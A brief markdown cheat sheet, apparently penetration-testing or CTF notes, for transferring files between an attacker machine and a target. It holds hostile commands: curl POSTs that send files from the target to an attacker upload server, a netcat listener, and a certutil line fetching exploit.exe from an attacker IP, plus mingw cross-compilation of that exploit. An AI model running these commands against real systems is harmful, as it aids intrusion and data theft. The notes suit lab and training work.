##### Start [uploadserver](https://pypi.org/project/uploadserver/) with Python locally
```sh
python3 -m uploadserver 8888
```
##### POST files to local
```sh
curl -file="@/path/to/file" IP:8888/upload 
curl -X POST http://IP:8888/upload -F "files=@/path/to/file"
```
##### GET files to box
```sh
wget IP:8888/path/to/file
```

##### Without curl og wget
###### On box
```sh
cat file | busybox nc -l -p 8888
```
###### On local
```sh
wget IP:8888
```

## Windows
##### WGET
```sh
certutil -urlcache -f http://10.10.15.7:8000/exploit.exe exploit.exe
```
#### Compile exe files on linux
```sh
sudo apt install mingw-w64
i686-w64-mingw32-gcc C_FIL -o exploit.exe -lws2_32
```
